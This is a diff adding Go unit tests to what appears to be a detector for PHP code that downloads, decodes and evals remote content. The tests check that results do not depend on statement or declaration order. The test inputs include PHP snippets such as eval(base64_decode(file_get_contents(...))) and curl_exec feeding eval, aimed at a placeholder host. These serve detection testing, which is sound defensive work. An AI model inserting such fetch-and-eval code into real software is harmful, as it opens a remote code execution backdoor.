@@ -122,3 +122,106 @@ eval($d);`},
 		})
 	}
 }
+
+// The Certain upgrade must not make the reported basis depend on the order
+// the solver happens to visit values. Both statement orders below hold the
+// same facts: $a carries a High always-remote value and a Certain literal
+// value, and $b decodes $a, so both become Certain and the spec's priority
+// picks always-remote.
+func TestBasisIndependentOfStatementOrder(t *testing.T) {
+	const (
+		plain   = `$a = curl_exec($c);`
+		decoded = `$a = base64_decode(file_get_contents('https://example.invalid/p'));`
+		use     = `$b = base64_decode($a);`
+		sink    = `eval($b);`
+	)
+	orders := []string{
+		"<?php " + plain + " " + use + " " + decoded + " " + sink,
+		"<?php " + decoded + " " + use + " " + plain + " " + sink,
+	}
+	var want string
+	for i, src := range orders {
+		got := onlyResult(t, []byte(src))
+		if got.Confidence != ConfidenceCertain || got.Basis != BasisAlwaysRemote || got.ResolutionOffset != -1 {
+			t.Errorf("order %d: result = %+v, want Certain always-remote offset -1", i, got)
+		}
+		fp := reportFingerprint(Analyze(context.Background(), []byte(src)))
+		if i == 0 {
+			want = fp
+		} else if fp != want {
+			t.Errorf("statement order changed the report:\n first: %s\n this:  %s", want, fp)
+		}
+	}
+}
+
+// Same property across summaries: the fixpoint over bodies must reach one
+// answer whatever order the functions are declared in.
+func TestBasisIndependentOfDeclarationOrder(t *testing.T) {
+	decls := []string{
+		"function g(){ return base64_decode(f()); }\n",
+		"function f(){ return curl_exec($c) . h(); }\n",
+		"function h(){ return base64_decode(file_get_contents('https://example.invalid/p')); }\n",
+	}
+	var want string
+	for i, order := range permutations(decls) {
+		src := "<?php\n"
+		for _, d := range order {
+			src += d
+		}
+		src += "eval(g());\n"
+		got := onlyResult(t, []byte(src))
+		if got.Confidence != ConfidenceCertain || got.Basis != BasisAlwaysRemote {
+			t.Errorf("order %v: result = %+v, want Certain always-remote", order, got)
+		}
+		fp := reportFingerprint(Analyze(context.Background(), []byte(src)))
+		if i == 0 {
+			want = fp
+		} else if fp != want {
+			t.Errorf("declaration order changed the report:\n first: %s\n this:  %s\n source:\n%s", want, fp, src)
+		}
+	}
+}
+
+// The upgrade on the assignment path keeps the acquiring call's basis, the
+// same rule the sink path follows.
+func TestSolverDecodeKeepsSourceBasis(t *testing.T) {
+	got := onlyResult(t, []byte(`<?php $b = base64_decode(file_get_contents('https://example.invalid/p')); eval($b);`))
+	if got.Confidence != ConfidenceCertain || got.Basis != BasisLiteral || got.ResolutionOffset != -1 {
+		t.Fatalf("result = %+v, want Certain literal offset -1", got)
+	}
+}
+
+// The join is pointwise per basis: each basis keeps its own best proof, and
+// add reports growth only when some entry actually improved, which is what
+// lets every fixpoint over gradeSet stop.
+func TestGradeSetJoin(t *testing.T) {
+	var s gradeSet
+	if !s.add(setOf(grade{ConfidenceHigh, BasisCallArgument, 9})) {
+		t.Fatal("first proof: want growth")
+	}
+	if s.add(setOf(grade{ConfidenceHigh, BasisCallArgument, 9})) {
+		t.Error("equal proof: want no growth")
+	}
+	if s.add(setOf(grade{ConfidenceLow, BasisCallArgument, 1})) {
+		t.Error("lower confidence on the same basis: want no growth")
+	}
+	if !s.add(setOf(grade{ConfidenceHigh, BasisCallArgument, 3})) {
+		t.Error("lower offset on the same basis and confidence: want growth")
+	}
+	if !s.add(setOf(grade{ConfidenceLow, BasisUnresolved, -1})) {
+		t.Error("weaker proof on a new basis: want growth, bases join pointwise")
+	}
+	if got := s.strongest(); got != (grade{ConfidenceHigh, BasisCallArgument, 3}) {
+		t.Errorf("strongest = %+v, want High call-argument offset 3", got)
+	}
+	d := s.decoded()
+	if got := d.strongest(); got != (grade{ConfidenceCertain, BasisCallArgument, 3}) {
+		t.Errorf("decoded strongest = %+v, want Certain call-argument offset 3", got)
+	}
+	if e := d.entries[basisRank(BasisUnresolved)]; !e.present || e.conf != ConfidenceCertain {
+		t.Errorf("decoded unresolved entry = %+v, want Certain: the upgrade applies to every proof", e)
+	}
+	if !(gradeSet{}).isEmpty() || s.isEmpty() {
+		t.Error("isEmpty disagrees with contents")
+	}
+}
